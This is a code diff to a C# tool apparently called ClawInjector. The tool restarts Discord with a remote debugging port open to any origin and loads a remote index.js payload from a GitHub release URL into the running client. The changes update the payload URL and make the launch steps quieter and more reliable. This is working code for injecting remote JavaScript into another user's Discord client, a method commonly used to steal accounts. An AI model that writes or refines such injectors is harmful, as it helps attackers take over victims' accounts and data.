@@ -16,7 +16,7 @@ namespace ClawInjector
 {
     internal static class Program
     {
-        private const string DefaultPayloadUrl = "https://raw.githubusercontent.com/l-limon-l/Claw/main/index.js";
+        private const string DefaultPayloadUrl = "https://github.com/l-limon-l/Claw/releases/download/Main/index.js";
         private const int DefaultDebugPort = 10222;
         private static readonly TimeSpan DiscordTargetTimeout = TimeSpan.FromSeconds(90);
         private static readonly TimeSpan StableTargetDelay = TimeSpan.FromSeconds(8);
@@ -267,7 +267,7 @@ namespace ClawInjector
             {
                 ProcessStartInfo startInfo = new ProcessStartInfo
                 {
-                    FileName = "netstat",
+                    FileName = GetSystemExecutablePath("netstat.exe"),
                     Arguments = "-ano -p tcp",
                     UseShellExecute = false,
                     RedirectStandardOutput = true,
@@ -323,6 +323,18 @@ namespace ClawInjector
             return pids;
         }
 
+        private static string GetSystemExecutablePath(string fileName)
+        {
+            string systemRoot = Environment.GetFolderPath(Environment.SpecialFolder.System);
+            string fullPath = Path.Combine(systemRoot, fileName);
+            if (File.Exists(fullPath))
+            {
+                return fullPath;
+            }
+
+            throw new FileNotFoundException("Could not resolve required Windows system executable.", fullPath);
+        }
+
         private static bool IsDiscordProcess(Process process)
         {
             string[] names = { "Discord", "DiscordPTB", "DiscordCanary" };
@@ -347,15 +359,13 @@ namespace ClawInjector
         {
             ProcessStartInfo startInfo = new ProcessStartInfo
             {
-                FileName = "cmd.exe",
+                FileName = discordPath,
                 Arguments = string.Format(
-                    "/d /c start \"\" \"{0}\" --remote-debugging-port={1} --remote-allow-origins=*",
-                    discordPath,
+                    "--remote-debugging-port={0} --remote-allow-origins=*",
                     debugPort),
                 UseShellExecute = false,
                 CreateNoWindow = true,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true
+                WorkingDirectory = Path.GetDirectoryName(discordPath)
             };
 
             using (Process process = Process.Start(startInfo))
@@ -363,18 +373,6 @@ namespace ClawInjector
                 if (process == null)
                 {
                     throw new InvalidOperationException("Failed to start Discord.");
-                }
-
-                if (!process.WaitForExit(5000))
-                {
-                    try { process.Kill(); } catch { }
-                    throw new TimeoutException("Discord launcher did not return in time.");
-                }
-
-                if (process.ExitCode != 0)
-                {
-                    string error = process.StandardError.ReadToEnd();
-                    throw new InvalidOperationException("Discord launcher failed: " + error);
                 }
             }
 
